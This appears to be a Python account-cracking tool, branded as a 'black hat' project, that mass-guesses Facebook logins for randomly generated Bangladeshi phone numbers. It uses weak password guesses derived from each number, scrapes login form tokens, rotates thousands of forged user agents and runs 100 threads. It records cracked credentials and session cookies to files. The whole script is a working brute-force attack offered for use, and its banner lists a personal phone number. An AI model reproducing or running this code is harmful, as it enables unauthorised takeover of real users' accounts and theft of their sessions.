import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system("espeak \"Wall come To NAYEEM Boss World sir, Bangladesh Random Cloning Start Please Wait\"")
logo=("""

  _   _                                 
 | \ | |                                
 |  \| | __ _ _   _  ___  ___ _ __ ___  
 | . ` |/ _` | | | |/ _ \/ _ \ '_ ` _ \ 
 | |\  | (_| | |_| |  __/  __/ | | | | |
 |_| \_|\__,_|\__, |\___|\___|_| |_| |_|
               __/ |                    
              |___/                                                                
 \033[1;91m┏━━━━━━━━━━━\033[1;93m━━━━━━━━━━\033[1;91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 \033[1;91m┃ \033[1;92m┏━━━━━━━━━━>\033[1;96m BLACK HAT HACKER GANG BD \033[1;92m<━━━━━━━━━┓ \033[1;91m1┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┏━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━┓ \033[1;92mH┃ \033[1;91m2┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] AUTHOR   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mBHH ALHAJ KING         \033[1;93mA┃ \033[1;92mI┃ \033[1;91m3┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] TOOL     \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mRANDOM CLONE           \033[1;93mB┃ \033[1;92mJ┃ \033[1;91m4┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] TOOL NUM \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92V23                     \033[1;93mC┃ \033[1;92mK┃ \033[1;91m5┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] STATUS   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mFREE                   \033[1;93mD┃ \033[1;92mK┃ \033[1;91m6┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] VERSION  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m8.2                    \033[1;93mE┃ \033[1;92mK┃ \033[1;91m7┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] SYSTEM   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mDATA & WIFI            \033[1;93mF┃ \033[1;92mL┃ \033[1;91m8┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] NETWORK  \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m3G - 4G -5G            \033[1;93mG┃ \033[1;92mM┃ \033[1;91m9┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] FACEBOOK \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNAYEEM NAWAZ           \033[1;93mH┃ \033[1;92mN┃ \033[1;91mA┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] GITHUB   \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92mNayeem999+             \033[1;93mI┃ \033[1;92mP┃ \033[1;91mB┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┃ \033[1;95m[✓] WHATSAPP \033[1;93m❯\033[1;92m❯\033[1;91m❯ \033[1;92m+8801827673253         \033[1;93mJ┃ \033[1;92mQ┃ \033[1;91mC┃
 \033[1;91m┃ \033[1;92m┃ \033[1;93m┗━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;92m━━━━━━━━━\033[1;93m━━━━━━━┛ \033[1;92mR┃ \033[1;91mD┃
 \033[1;91m┃ \033[1;92m┗━━━━━> \033[1;96mFB-Nayeem999+\033[1;92m<━━━━━━┛ \033[1;91mE┃
 \033[1;91m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;93m━━━━━━━━━━\033[1;91m━━━━━━━━━━━━━┛""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def fuck():
    user=[]
    os.system('clear')
    os.system('xdg-open https://https://www.facebook.com/nayeem0988?mibextid=ZbWKwL/')
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as 𝐍𝐀𝐘𝐄𝐄𝐌:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY 𝐍𝐀𝐘𝐄𝐄𝐌 999+ ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
            𝐍𝐀𝐘𝐄𝐄𝐌.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%s𝐍𝐀𝐘𝐄𝐄𝐌\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {       
    'authority': 'm.facebook.com',
    'method': 'GET',
    'path': '/login/device-based/login/async/',
    'scheme': 'https',     
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.924999952316284',
    'referer': 'https://m.facebook.com/',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="116", "Google Chrome";v="116"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5791.214", "Google Chrome";v="116.0.5791.214"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"V2130"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; P20HD_ROW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5791.214 Mobile Safari/537.36',
    'viewport-width': '980',
}




            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[𝐍𝐀𝐘𝐄𝐄𝐌-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/𝐍𝐀𝐘𝐄𝐄𝐌-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐍𝐀𝐘𝐄𝐄𝐌-CP💔] {uid} • {ps}")
                open('/sdcard/𝐍𝐀𝐘𝐄𝐄𝐌-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()